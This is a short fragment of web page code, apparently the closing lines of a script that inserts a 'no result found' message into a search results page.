class="mt-5">Oops! No result founds.</p>' }); </script>
